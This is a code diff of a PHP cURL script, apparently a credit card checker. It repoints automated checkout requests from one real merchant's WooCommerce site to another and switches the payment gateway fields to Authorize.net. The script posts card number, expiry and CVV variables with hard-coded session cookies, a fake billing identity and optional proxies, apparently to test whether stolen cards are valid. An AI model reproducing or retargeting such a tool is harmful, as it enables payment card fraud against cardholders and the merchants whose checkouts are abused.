@@ -205,7 +205,7 @@ $dbtime = substr(str_shuffle(str_repeat("0123456789", 10)), 0, 10);
 // // //////////////////////// START REQUEST 2 ////////////////////////
 
 $ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, 'https://www.mbottiglieri.com/checkout/?wc-ajax=checkout');
+curl_setopt($ch, CURLOPT_URL, 'https://scarmd.net/?wc-ajax=checkout');
 
 //////////////////////// PROXY CALLS ////////////////////////////
 //               REMOVE '//' FOR PROXIES TO WORK BELOW
@@ -238,15 +238,15 @@ curl_setopt($ch, CURLOPT_HTTPHEADER, array(
 'accept-encoding: gzip, deflate, br',
 'accept-language: en-US,en;q=0.9',
 'content-type: application/x-www-form-urlencoded; charset=UTF-8',
-'cookie: PHPSESSID=8567d2374fd7d5e207644af0696ab494; igSplash=igSplash; wc_wishlists_user[key]=5a0482db23c6b531d5c95310710c29935ee98a6d5f46e; po_c-3042=1; igCountry=US; woocommerce_items_in_cart=1; wp_woocommerce_session_67059e62dca53c2adf5f195e4c53082f=1d9b684060f54971ef6b45607d08887c%7C%7C1592536666%7C%7C1592533066%7C%7C36a8e7da14d20ac0e907e60617d4b82f; woocommerce_cart_hash=205eaf02653cb516e7c21fe1ffa2bd14',
-'origin: https://www.mbottiglieri.com',
-'referer: https://www.mbottiglieri.com/checkout/',
+'cookie: PHPSESSID=fe0c2951a807cd95a195d04108bfffe0; woocommerce_items_in_cart=1; wp_woocommerce_session_442495aa9cdcf351345a7f4758563058=96b45e5bb6f8d97e1cc688313ea03dfc%7C%7C1592539440%7C%7C1592535840%7C%7C0ab8a47ea98a0116bf1c757be2dbcb03; woocommerce_cart_hash=5298f7e3f5362da3e6ddc90f036f2f4f',
+'origin: https://scarmd.net',
+'referer: https://scarmd.net/checkout/',
 'user-agent: '.$browser.''
 ));
 
 //////////////////////// START POST FILED 1 ////////////////////////
 
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'billing_first_name=Vincnet&billing_last_name=Warner&billing_company=&billing_email=pubgkittu%40gmail.com&billing_phone=5182641524&billing_country=US&billing_address_1=12+avenue&billing_address_2=&billing_city=Miami&billing_state=FL&billing_postcode=33101&account_password=&shipping_first_name=&shipping_last_name=&shipping_company=&shipping_country=US&shipping_address_1=&shipping_address_2=&shipping_city=&shipping_state=FL&shipping_postcode=33101&order_comments=&shipping_method%5B0%5D=table_rate_shipping_flat&payment_method=usaepay&usaepay_ccnum='.$cc.'&usaepay_cardholdername=Vincent+Warner&usaepay_expmonth='.$mes.'&usaepay_expyear='.$ano1.'&usaepay_cvv='.$cvv.'&_wpnonce=ab44727fb0&_wp_http_referer=%2Fcheckout%2F%3Fwc-ajax%3Dupdate_order_review');
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'billing_first_name=Vincnet&billing_last_name=Warner&billing_company=&billing_country=US&billing_address_1=12+avenue&billing_address_2=&billing_city=Miami&billing_state=FL&billing_postcode=33101&billing_phone=5182641524&billing_email=pubgkittu%40gmail.com&account_password=&shipping_first_name=&shipping_last_name=&shipping_company=&shipping_country=US&shipping_address_1=&shipping_address_2=&shipping_city=&shipping_state=FL&shipping_postcode=&order_comments=&shipping_method%5B0%5D=legacy_flat_rate&payment_method=authnet&authnet-card-number='.$cc1.'+'.$cc2.'+'.$cc3.'+'.$cc4.'&authnet-card-expiry='.$mes.'+%2F+'.$ano1.'&authnet-card-cvc='.$cvv.'&_wpnonce=d82c47500d&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review');
 
 // // // // //*****************************************************************************************************************************************************************************************************************************************************************************
 
